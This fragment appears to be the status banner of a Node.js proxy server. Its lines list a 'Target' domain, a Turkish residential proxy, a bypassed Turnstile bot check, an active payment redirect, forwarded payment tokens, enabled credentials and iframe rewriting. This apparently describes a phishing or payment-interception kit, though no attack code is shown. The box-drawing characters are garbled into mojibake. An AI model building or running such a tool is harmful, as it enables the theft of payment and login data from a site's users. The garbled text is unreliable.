ÔòáÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòú
Ôòæ  Port: ${PORT}                            Ôòæ
Ôòæ  Target: ${CONFIG.domain.target}  Ôòæ
Ôòæ  Proxy: Ô£ô DataImpulse (TR)             Ôòæ
Ôòæ  WebSocket: Ô£ô Enabled                  Ôòæ
Ôòæ  Turnstile: Ô£ô Bypassed                 Ôòæ
Ôòæ  Payment Redirect: Ô£ô Active            Ôòæ
Ôòæ  NWA API: Ô£ô CORS Fixed                 Ôòæ
Ôòæ  NWA Credentials: Ô£ô Enabled            Ôòæ
Ôòæ  Payment Token: Ô£ô Forwarded            Ôòæ
Ôòæ  Iframe Rewrite: Ô£ô Active              Ôòæ
Ôòæ  PostMessage Fix: Ô£ô Active             Ôòæ
Ôòæ  Nuts Bypass: Ô£ô Active                 Ôòæ
ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ
  `);
});
